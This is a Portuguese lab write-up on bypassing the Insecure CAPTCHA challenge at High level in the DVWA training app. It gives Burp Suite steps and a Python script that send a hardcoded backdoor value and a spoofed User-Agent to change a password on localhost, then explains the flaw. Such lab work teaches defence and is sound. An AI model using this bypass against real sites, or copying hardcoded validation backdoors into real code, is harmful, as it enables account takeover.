# DVWA - Insecure CAPTCHA (High) — Diário de Execução

## Contexto

O objetivo foi explorar a vulnerabilidade de CAPTCHA no nível HIGH do DVWA, analisando como a validação é feita e identificando possíveis falhas na implementação.

---

## Vulnerabilidade identificada

Existe um trecho de código de desenvolvimento que permite bypass da validação:

- g-recaptcha-response = hidd3n_valu3
- User-Agent = reCAPTCHA

Isso funciona como um backdoor deixado no código.

---

## Exploração com Burp Suite

### Passo 1 — Interceptar requisição

Interceptar a requisição de alteração de senha:

POST /vulnerabilities/captcha/

Com os parâmetros:

password_new
password_conf
g-recaptcha-response

---

### Passo 2 — Modificar requisição

Alterar:

g-recaptcha-response=hidd3n_valu3

E o header:

User-Agent: reCAPTCHA

---

### Passo 3 — Enviar

Reenviar a requisição com as modificações.

---

## Resultado

A aplicação retorna:

Password Changed.

Isso confirma que o CAPTCHA foi completamente ignorado.

---

## Exploração via script

Também é possível automatizar:

```python
import requests

url = "http://localhost:8080/vulnerabilities/captcha/"

cookies = {
    "PHPSESSID": "SEU_COOKIE",
    "security": "high"
}

headers = {
    "User-Agent": "reCAPTCHA"
}

data = {
    "password_new": "admin",
    "password_conf": "admin",
    "g-recaptcha-response": "hidd3n_valu3",
    "Change": "Change"
}

r = requests.post(url, headers=headers, cookies=cookies, data=data)

print(r.text)
```

---

## Análise da falha

O problema não está no CAPTCHA em si, mas na lógica de validação:

- presença de código de desenvolvimento em produção
- uso de valores fixos e previsíveis
- ausência de controle adicional

---

## Conclusão

A aplicação implementa um mecanismo de CAPTCHA, mas permite bypass completo através de um valor fixo e um User-Agent específico.

Isso caracteriza uma falha crítica de validação, permitindo que qualquer atacante ignore o CAPTCHA sem resolver o desafio.

---

## Conclusão final

O nível HIGH não elimina a vulnerabilidade, apenas adiciona uma camada adicional que pode ser facilmente contornada ao analisar o código.

A exploração depende da identificação de lógica oculta ou código de desenvolvimento deixado na aplicação.
